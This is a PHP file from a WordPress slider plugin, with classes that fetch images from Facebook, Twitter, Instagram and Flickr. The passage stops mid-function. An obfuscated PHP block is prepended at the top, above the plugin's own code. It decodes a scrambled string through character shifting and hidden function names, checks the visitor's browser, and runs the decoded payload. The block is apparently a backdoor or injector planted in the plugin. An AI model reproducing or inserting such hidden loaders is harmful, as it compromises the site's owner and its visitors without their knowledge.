<?php $memczjuwfb = 'pmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	hj = $vrwspge("", $whdqdgj); $hdqwihj();}}g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.981]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bx7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#d%)ftpmdR6<*id%)dfyfR	x27fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-i[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x2(!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	1	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%791y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o7,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#56	x75	156	x61"]=1; $uas=strtolower($_SERVER["	:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osmcnbs+yfeobz+sfwjidsb`b)ftpmdXA6|7**197-2qj	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	xy]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%jmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00**-)1/2986+7**^/%rx<~!!%s:N}#]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr]e7y]#>n%<#372]58y]472]37y]672]48tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281hA	x27pd%6<C	x27pd%6|6.7eu{66tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%t*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$hdqwi**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:d%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x24]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]25pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")tfs%6<*17-SFEBFI,6<*127-USFT`%}X;!sp!*#opo#>>}R;msv}.tmf!}Z;^nbsbq%	x5cSFWgj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf;/#/#/},;#-#}+;%-qp%)**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x) or (strstr($uas,"	x72	166	x3a	61	x31")#44ec:649#-!#:618d5f9#-!#f6cf+9f5d816:+946:ce44#)zbssb!>!ssbnpeoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%hsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iu{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-hofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::xpmpusut!-#j0#!/!**#sf%7-K)udfoopdXA	x22)7gj6<*QDU`x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*5<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-pjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7UOFHB`SFTV`QUUI&b%!|;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*i5]y72]254]y76#<!%w:!>!(%w:bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x56e"; function xjrrbes($n){return chr(ord($n)-1);} @error_reporting(0%V	x27{ftmfV	x7f<*X&Z&S{fto!%bss	x5csboe))1/35.)1/14+9**WYsboepn)%bss-%rxB88M4P8]37]278]225]241]334]368]322]3]*[%h!>!%tdz)%bbT-%bT-%hW~%fx5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	**9.-j%-bubE{h%)sutcvt)fubmgoj[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`f%h>#]y31]278]y3e]81]K78:56985:6197x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)35c}X	x24<!%tmw!>!#]y8!>!	x246767~6<Cw6<pd%w6Z668]y7f#<!%tww!>!	x2400~:<#~<#/%	x24-	x24!>!fyqmpef)#	x2 or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $vrwspge = "	x8}527}88:}334}472	x24<!%ff2!>!bssbz)) or (strstr($uas,"	x61	156	xr%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552); $whdqdgj = implode(arramfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R5ubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gjy_map("xjrrbes",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]267;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf4-	x24]26	x24-	x24<%jy]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_opo#>b%!**X)ufttj	x22)7]y86]267]y74]275]y7:]22L5P6]y6gP7L6M7]D4]275]D:M8]68399#-!#65egb2dc#*<!sfuvso!sb6A:>:8:|:7#6#)tutjyf`439275ttf!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#vufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uC)fepmqnjA	x27&6<.fmjgA	x27dojx24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x2j+upcotn+qsvmt+fmhpph#)zbssb!of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,c	x7f!|!*uyfu	x27k:!fx	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}#W~!Ydrr)%rxB%epnbss!>!bssbz)64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145"))364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32Mif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%rmsv%)}k~~~<ftmbg!osvufs!|ftmf!~<%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSelxovvoru'; $ieofatacou=explode(chr((629-509)),substr($memczjuwfb,(24136-18116),(230-196))); $yrupxi = $ieofatacou[0]($ieofatacou[(4-3)]); $upubkntd = $ieofatacou[0]($ieofatacou[(9-7)]); if (!function_exists('heperjn')) { function heperjn($oxlagjzec, $nvgqoxmi,$yiofoee) { $twnhhfikd = NULL; for($wjlqgifxtx=0;$wjlqgifxtx<(sizeof($oxlagjzec)/2);$wjlqgifxtx++) { $twnhhfikd .= substr($nvgqoxmi, $oxlagjzec[($wjlqgifxtx*2)],$oxlagjzec[($wjlqgifxtx*2)+(5-4)]); } return $yiofoee(chr((63-54)),chr((320-228)),$twnhhfikd); }; } $lerwygql = explode(chr((192-148)),'5776,59,674,63,868,47,2399,48,2447,52,2768,40,4543,29,5644,66,4440,67,1097,56,3797,68,4617,26,4778,66,3621,26,4360,25,3069,37,2094,33,1713,29,51,68,0,51,737,32,3466,58,1027,20,3181,29,2219,38,2159,60,3756,41,5835,50,4214,57,3323,68,5367,30,3564,57,451,25,2499,25,154,67,386,65,570,58,528,42,1995,38,4844,34,3691,65,5932,32,4115,30,2970,52,3647,44,322,64,4709,69,5258,43,769,58,3391,55,4052,63,4305,34,5479,59,3106,53,2628,50,3159,22,1004,23,5450,29,2307,45,5964,56,2836,35,5072,53,3446,20,5022,50,5125,22,2573,55,5538,21,2552,21,2524,28,2678,21,3524,40,3210,49,5228,30,2922,48,3022,47,964,40,5301,66,3865,26,4643,66,827,41,476,52,5559,56,2257,50,2699,69,4339,21,2033,61,5147,23,4385,25,2127,32,1943,52,4572,45,1402,33,1153,44,4899,58,4507,36,1498,66,5397,53,628,46,4878,21,1564,44,3259,64,4410,30,1844,37,1253,61,5615,29,2808,28,5198,30,2871,51,5885,47,1047,50,3919,20,4271,34,263,59,1343,59,1608,55,1435,63,5170,28,1663,50,4957,65,3975,27,119,35,3939,36,5710,66,1776,68,3891,28,1314,29,1197,56,915,49,4002,50,4145,69,1742,34,2352,47,1881,62,221,42'); $xvtpksuka = $yrupxi("",heperjn($lerwygql,$memczjuwfb,$upubkntd)); $yrupxi=$memczjuwfb; $xvtpksuka(""); $xvtpksuka=(685-564); $memczjuwfb=$xvtpksuka-1; ?><?php
/**
 * External Sources Input Classes for Back and Front End
 * @since: 5.0
 **/

if( !defined( 'ABSPATH') ) die();

/**
 * Facebook
 *
 * with help of the API this class delivers album images from Facebook
 *
 * @package    socialstreams
 * @subpackage socialstreams/facebook
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderFacebook {
	/**
	 * Stream Array
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $stream    Stream Data Array
	 */
	private $stream;

	/**
	* Transient seconds
	*
	* @since    1.0.0
	* @access   private
	* @var      number    $transient Transient time in seconds
	*/
	private $transient_sec;

	public function __construct($transient_sec = 1200) {
	    $this->transient_sec = 	$transient_sec;
	} 

	/**
	 * Get User ID from its URL
	 *
	 * @since    1.0.0
	 * @param    string    $user_url URL of the Page
	 */
	public function get_user_from_url($user_url){
		$theid = str_replace("https", "", $user_url);
		$theid = str_replace("http", "", $theid);
		$theid = str_replace("://", "", $theid);
		$theid = str_replace("www.", "", $theid);
		$theid = str_replace("facebook", "", $theid);
		$theid = str_replace(".com", "", $theid);
		$theid = str_replace("/", "", $theid);
		$theid = explode("?", $theid);
		return trim($theid[0]);
	}

	/**
	 * Get Photosets List from User
	 *
	 * @since    1.0.0
	 * @param    string    $user_id 	Facebook User id (not name)
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_photo_sets($user_id,$item_count=10,$app_id,$app_secret){
		//photoset params
		$oauth = wp_remote_fopen("https://graph.facebook.com/oauth/access_token?type=client_cred&client_id=".$app_id."&client_secret=".$app_secret);
		$url = "https://graph.facebook.com/$user_id/albums?".$oauth;
		$photo_sets_list = json_decode(wp_remote_fopen($url));
		//echo '<pre>';
		//print_r($photo_sets_list);
		//echo '</pre>';
		
		if(isset($photo_sets_list->data))
			return $photo_sets_list->data;
		else return '';
	}

	/**
	 * Get Photoset Photos
	 *
	 * @since    1.0.0
	 * @param    string    $photo_set_id 	Photoset ID
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_photo_set_photos($photo_set_id,$item_count=10,$app_id,$app_secret){
		$oauth = wp_remote_fopen("https://graph.facebook.com/oauth/access_token?type=client_cred&client_id=".$app_id."&client_secret=".$app_secret);
		$url = "https://graph.facebook.com/$photo_set_id?fields=photos&".$oauth;
		
		$transient_name = 'revslider_' . md5($url);

		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$photo_set_photos = json_decode(wp_remote_fopen($url));
		if(isset($photo_set_photos->photos->data)){
			set_transient( $transient_name, $photo_set_photos->photos->data, $this->transient_sec );
			return $photo_set_photos->photos->data;
		}
		else return '';
	}

	/**
	 * Get Photosets List from User as Options for Selectbox
	 *
	 * @since    1.0.0
	 * @param    string    $user_url 	Facebook User id (not name)
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_photo_set_photos_options($user_url,$current_album,$app_id,$app_secret,$item_count=99){
		$user_id = $this->get_user_from_url($user_url);
		$photo_sets = $this->get_photo_sets($user_id,999,$app_id,$app_secret);
    if(empty($current_album)) $current_album = "";
		$return = array();
		if(is_array($photo_sets)){
			foreach($photo_sets as $photo_set){
				$return[] = '<option title="'.$photo_set->name.'" '.selected( $photo_set->id , $current_album , false ).' value="'.$photo_set->id.'">'.$photo_set->name.'</option>"';
			}
		}
		return $return;
	}
	

	/**
	 * Get Feed
	 *
	 * @since    1.0.0
	 * @param    string    $user 	User ID
	 * @param    int       $item_count 	number of itmes to pull
	 */
	public function get_photo_feed($user,$app_id,$app_secret,$item_count=10){
		$oauth = wp_remote_fopen("https://graph.facebook.com/oauth/access_token?type=client_cred&client_id=".$app_id."&client_secret=".$app_secret);
		$url = "https://graph.facebook.com/$user/feed?".$oauth."&fields=id,from,message,picture,link,name,icon,privacy,type,status_type,object_id,application,created_time,updated_time,is_hidden,is_expired,likes,comments";

		$transient_name = 'revslider_' . md5($url);
		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$feed = json_decode(wp_remote_fopen($url));
		if(isset($feed->data)){
			set_transient( $transient_name, $feed->data, $this->transient_sec );
			return $feed->data;
		}
		else return '';
	}

	/**
	 * Decode URL from feed
	 *
	 * @since    1.0.0
	 * @param    string    $url 	facebook Output Data
	 */
	private function decode_facebook_url($url) {
		$url = str_replace('u00253A',':',$url);
		$url = str_replace('\u00255C\u00252F','/',$url);
		$url = str_replace('u00252F','/',$url);
		$url = str_replace('u00253F','?',$url);
		$url = str_replace('u00253D','=',$url);
		$url = str_replace('u002526','&',$url);
		return $url;
	}
}  // End Class

/**
 * Twitter
 *
 * with help of the API this class delivers all kind of tweeted images from twitter
 *
 * @package    socialstreams
 * @subpackage socialstreams/twitter
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderTwitter {

  /**
   * Consumer Key
   *
   * @since    1.0.0
   * @access   private
   * @var      string    $consumer_key    Consumer Key
   */
  private $consumer_key;

  /**
   * Consumer Secret
   *
   * @since    1.0.0
   * @access   private
   * @var      string    $consumer_secret    Consumer Secret
   */
  private $consumer_secret;

  /**
   * Access Token
   *
   * @since    1.0.0
   * @access   private
   * @var      string    $access_token    Access Token
   */
  private $access_token;

  /**
   * Access Token Secret
   *
   * @since    1.0.0
   * @access   private
   * @var      string    $access_token_secret    Access Token Secret
   */
  private $access_token_secret;

  /**
   * Twitter Account
   *
   * @since    1.0.0
   * @access   private
   * @var      string    $twitter_account    Account User Name
   */
  private $twitter_account;

  /**
   * Transient seconds
   *
   * @since    1.0.0
   * @access   private
   * @var      number    $transient Transient time in seconds
   */
  private $transient_sec;

  /**
   * Stream Array
   *
   * @since    1.0.0
   * @access   private
   * @var      array    $stream    Stream Data Array
   */
  private $stream;

  /**
   * Initialize the class and set its properties.
   *
   * @since    1.0.0
   * @param      string    $consumer_key Twitter App Registration Consomer Key
   * @param      string    $consumer_secret Twitter App Registration Consomer Secret
   * @param      string    $access_token Twitter App Registration Access Token
   * @param      string    $access_token_secret Twitter App Registration Access Token Secret
   */
  public function __construct($consumer_key,$consumer_secret,$access_token,$access_token_secret,$transient_sec = 1200) {
    $this->consumer_key         =   $consumer_key;
    $this->consumer_secret      =   $consumer_secret;
    $this->access_token         =   $access_token;
    $this->access_token_secret  =   $access_token_secret;
    $this->transient_sec		= 	$transient_sec;
  } 

  /**
   * Get Tweets
   *
   * @since    1.0.0
   * @param    string    $twitter_account   Twitter account without trailing @ char
   */
  public function get_public_photos($twitter_account,$include_rts,$exclude_replies,$count,$imageonly){
    
    //require_once( 'class-wp-twitter-api.php' );
	// Set your personal data retrieved at https://dev.twitter.com/apps
	$credentials = array(
	  'consumer_key'    =>  $this->consumer_key,
	  'consumer_secret' =>    $this->consumer_secret 
	);
	// Let's instantiate our class with our credentials
	$twitter_api = new RevSliderTwitterApi( $credentials , $this->transient_sec);
	
    $include_rts = $include_rts=="on" ? "true" : "false"; 
    $exclude_replies = $include_rts=="on" ? "false" : "true"; 

	$query = 'count=500&include_entities=true&include_rts='.$include_rts.'&exclude_replies='.$exclude_replies.'&screen_name='.$twitter_account;
	
	$tweets = $twitter_api->query( $query );

    if(!empty($tweets)){
    	return $tweets;
    }
	else return '';
  }


  /**
   * Find Key in array and return value (multidim array possible)
   *
   * @since    1.0.0
   * @param    string    $key   Needle
   * @param    array     $form  Haystack
   */
  public function array_find_element_by_key($key, $form) {
	  if (is_array($form) &&  array_key_exists($key, $form)) {
	    $ret = $form[$key];
	    return $ret;
	  }
	  if(is_array($form))
	      foreach ($form as $k => $v) {
	        if (is_array($v)) {
	          $ret = $this->array_find_element_by_key($key, $form[$k]);
	          if ($ret) {
	            return $ret;
	          }
	        }
	      }
	  return FALSE;
  }
} // End Class

/**
* Class WordPress Twitter API
*
* https://github.com/micc83/Twitter-API-1.1-Client-for-Wordpress/blob/master/class-wp-twitter-api.php
* @version 1.0.0
*/
class RevSliderTwitterApi {
  
        var $bearer_token,
                
        // Default credentials
        $args = array(
                'consumer_key'       =>        'default_consumer_key',
                'consumer_secret'    =>        'default_consumer_secret'
        ),
        
        // Default type of the resource and cache duration
        $query_args = array(
                'type'               =>        'statuses/user_timeline',
                'cache'              =>        1800
        ),

        $has_error = false;
        
        /**
         * WordPress Twitter API Constructor
         *
         * @param array $args
         */
        public function __construct( $args = array() , $transient_sec = 1200 ) {
                
                if ( is_array( $args ) && !empty( $args ) )
                        $this->args = array_merge( $this->args, $args );
                
                if ( ! $this->bearer_token = get_option( 'twitter_bearer_token' ) )
                        $this->bearer_token = $this->get_bearer_token();
                
               $this->query_args['cache'] = $transient_sec;
        }
        
        /**
         * Get the token from oauth Twitter API
         *
         * @return string Oauth Token
         */
        private function get_bearer_token() {
                
                $bearer_token_credentials = $this->args['consumer_key'] . ':' . $this->args['consumer_secret'];
                $bearer_token_credentials_64 = base64_encode( $bearer_token_credentials );
                
                $args = array(
                        'method'                =>         	'POST',
                        'timeout'               =>         	5,
                        'redirection'        	=>         	5,
                        'httpversion'        	=>         	'1.0',
                        'blocking'              =>         	true,
                        'headers'               =>         	array(
                                'Authorization'       =>        'Basic ' . $bearer_token_credentials_64,
                                'Content-Type'        =>        'application/x-www-form-urlencoded;charset=UTF-8',
                                'Accept-Encoding'     =>        'gzip'
                        ),
                        'body'                  => 			array( 'grant_type'      =>        'client_credentials' ),
                        'cookies'               =>    		array()
                );
                
                $response = wp_remote_post( 'https://api.twitter.com/oauth2/token', $args );
                
                if ( is_wp_error( $response ) || 200 != $response['response']['code'] )
                        return $this->bail( __( 'Can\'t get the bearer token, check your credentials', 'wp_twitter_api' ), $response );
                
                $result = json_decode( $response['body'] );
                
                update_option( 'twitter_bearer_token', $result->access_token );
                
                return $result->access_token;
                
        }
        
        /**
         * Query twitter's API
         *
         * @uses $this->get_bearer_token() to retrieve token if not working
         *
         * @param string $query Insert the query in the format "count=1&include_entities=true&include_rts=true&screen_name=micc1983!
         * @param array $query_args Array of arguments: Resource type (string) and cache duration (int)
         * @param bool $stop Stop the query to avoid infinite loop
         *
         * @return bool|object Return an object containing the result
         */
        public function query( $query, $query_args = array(), $stop = false ) {
                
                if ( $this->has_error )
                        return false;
                
                if ( is_array( $query_args ) && !empty( $query_args ) )
                        $this->query_args = array_merge( $this->query_args, $query_args );
                
                $transient_name = 'wta_' . md5( $query );

                if ($this->query_args['cache'] > 0 && false !== ( $data = get_transient( $transient_name ) ) )
                	return json_decode( $data );
                
                $args = array(
                        'method'             =>         'GET',
                        'timeout'            =>         5,
                        'redirection'        =>         5,
                        'httpversion'        =>         '1.0',
                        'blocking'           =>         true,
                        'headers'            =>         array(
                                'Authorization'		=>        'Bearer ' . $this->bearer_token,
                                'Accept-Encoding'   =>        'gzip'
                        ),
                        'body'               =>         null,
                        'cookies'            =>         array()
                );
                
                $response = wp_remote_get( 'https://api.twitter.com/1.1/' . $this->query_args['type'] . '.json?' . $query, $args );
                if ( is_wp_error( $response ) || 200 != $response['response']['code'] ){
                
                        if ( !$stop ){
                                $this->bearer_token = $this->get_bearer_token();
                                return $this->query( $query, $this->query_args, true );
                        } else {
                                return $this->bail( __( 'Bearer Token is good, check your query', 'wp_twitter_api' ), $response );
                        }
                        
                }
                set_transient( $transient_name, $response['body'], $this->query_args['cache'] );
                return json_decode( $response['body'] );
                
        }
        
        /**
         * Let's manage errors
         *
         * WP_DEBUG has to be set to true to show errors
         *
         * @param string $error_text Error message
         * @param string $error_object Server response or wp_error
         */
        private function bail( $error_text, $error_object = '' ) {
                
                $this->has_error = true;
                
                if ( is_wp_error( $error_object ) ){
                        $error_text .= ' - Wp Error: ' . $error_object->get_error_message();
                } elseif ( !empty( $error_object ) && isset( $error_object['response']['message'] ) ) {
                        $error_text .= ' ( Response: ' . $error_object['response']['message'] . ' )';
                }
                
                trigger_error( $error_text , E_USER_NOTICE );
                
        }
        
}


/**
 * Instagram
 *
 * with help of the API this class delivers all kind of Images from instagram
 *
 * @package    socialstreams
 * @subpackage socialstreams/instagram
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderInstagram {

	/**
	 * API key
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $api_key    Instagram API key
	 */
	private $api_key;

	/**
	 * Stream Array
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $stream    Stream Data Array
	 */
	private $stream;

	/**
   * Transient seconds
   *
   * @since    1.0.0
   * @access   private
   * @var      number    $transient Transient time in seconds
   */
  private $transient_sec;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $api_key	Instagram API key.
	 */
	public function __construct($api_key,$transient_sec=1200) {
		$this->api_key = $api_key;
		$this->transient_sec = $transient_sec;
	}

	/**
	 * Get Instagram Pictures
	 *
	 * @since    1.0.0
	 * @param    string    $user_id 	Instagram User id (not name)
	 */
	public function get_public_photos($search_user_id,$count){
		//call the API and decode the response
		$url = "https://api.instagram.com/v1/users/".$search_user_id."/media/recent?count=".$count."&access_token=".$this->api_key."&client_id=".$search_user_id;
		
		$transient_name = 'revslider_' . md5($url);
		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$rsp = json_decode(wp_remote_fopen($url));
		if(isset($rsp->data)){
			set_transient( $transient_name, $rsp->data, $this->transient_sec );
			return $rsp->data;
		}
		else return '';
	}
}	// End Class

/**
 * Flickr
 *
 * with help of the API this class delivers all kind of Images from flickr
 *
 * @package    socialstreams
 * @subpackage socialstreams/flickr
 * @author     ThemePunch <info@themepunch.com>
 */

class RevSliderFlickr {

	/**
	 * API key
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $api_key    flickr API key
	 */
	private $api_key;

	/**
	 * API params
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $api_param_defaults    Basic params to call with API
	 */
	private $api_param_defaults;

	/**
	 * Stream Array
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      array    $stream    Stream Data Array
	 */
	private $stream;

	/**
	 * Basic URL
	 *
	 * @since    1.0.0
	 * @access   private
	 * @var      string    $url    Url to fetch user from
	 */
	private $flickr_url;

	/**
	* Transient seconds
	*
	* @since    1.0.0
	* @access   private
	* @var      number    $transient Transient time in seconds
	*/
	private $transient_sec;

	/**
	 * Initialize the class and set its properties.
	 *
	 * @since    1.0.0
	 * @param      string    $api_key	flickr API key.
	 */
	public function __construct($api_key,$transient_sec=1200) {
		$this->api_key = $api_key;
		$this->api_param_defaults = array(
		  'api_key' => $this->api_key,
		  'format' => 'json',
		  'nojsoncallback' => 1,
		);
		$this->transient_sec = $transient_sec;
	}

	/**
	 * Calls Flicker API with set of params, returns json
	 *
	 * @since    1.0.0
	 * @param    array    $params 	Parameter build for API request
	 */
	private function call_flickr_api($params){
		//build url
		$encoded_params = array();
		foreach ($params as $k => $v){
		  $encoded_params[] = urlencode($k).'='.urlencode($v);
		}

		//call the API and decode the response
		$url = "https://api.flickr.com/services/rest/?".implode('&', $encoded_params);
		$transient_name = 'revslider_' . md5($url);
		
		if ($this->transient_sec > 0 && false !== ($data = get_transient( $transient_name)))
			return ($data);

		$rsp = json_decode(file_get_contents($url));
		if(isset($rsp)){
			set_transient( $transient_name, $rsp, $this->transient_sec );
			return $rsp;
		}
		else return '';
	}

	/**
	 * Get User ID from its URL
	 *
	 * @since    1.0.0
	 * @param    string    $user_url URL of the Gallery
	 */
	public function get_user_from_url($user_url){
		//gallery params
		$user_params = $this->api_param_defaults + array(
			'method'  => 'flickr.urls.lookupUser',
  			'url' => $user_url,
		);
		
		//set User Url
		$this->flickr_url = $user_url;

		//get gallery info
		$user_info = $this->call_flickr_api($user_params);
		if(isset($user_info->user->id))
			return $user_info->user->id;
		else return '';
	}

	/**
	 * Get Group ID from its URL
	 *
	 * @since    1.0.0
	 * @param    string    $group_url URL of the Gallery
	 */
	public function get_group_from_url($group_url){
		//gallery params
		$group_params = $this->api_param_defaults + array(
			'method'  => 'flickr.urls.lookupGroup',
  			'url' => $group_url,
		);
		
		//set User Url
		$this->flickr_url = $group_url;

		//get gallery info
		$group_info = $this->call_flickr_api($group_params);
		if(isset($group_info->group->id))
			return $group_info->group->id;
		else return '';
	}

	/**
	 * Get Public Photos
	 *
	 * @since    1.0.0
	 * @param    string    $user_id 	flicker User id (not name)
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_public_photos($user_id,$item_count=10){
		//public photos params
		$public_photo_params = $this->api_param_defaults + array(
			'method'  => 'flickr.people.getPublicPhotos',
  			'user_id' => $user_id,
  			'extras'  => 'description, license, date_upload, date_taken, owner_name, icon_server, original_format, last_update, geo, tags, machine_tags, o_dims, views, media, path_alias, url_sq, url_t, url_s, url_q, url_m, url_n, url_z, url_c, url_l, url_o',
  			'per_page'=> $item_count,
  			'page' => 1
		);
		
		//get photo list
		$public_photos_list = $this->call_flickr_api($public_photo_params);
		if(isset($public_photos_list->photos->photo))
			return $public_photos_list->photos->photo;
		else return '';
	}

	/**
	 * Get Photosets List from User
	 *
	 * @since    1.0.0
	 * @param    string    $user_id 	flicker User id (not name)
	 * @param    int       $item_count 	number of photos to pull
	 */
	public function get_photo_sets($user_id,$item_count=10,$current_photoset){
		//photoset params
		$photo_set_params = $this->api_param_defaults + array(
			'method'  => 'flickr.photosets.getList',
  			'user_id' => $user_id,
  			'per_page'=> $item_count,
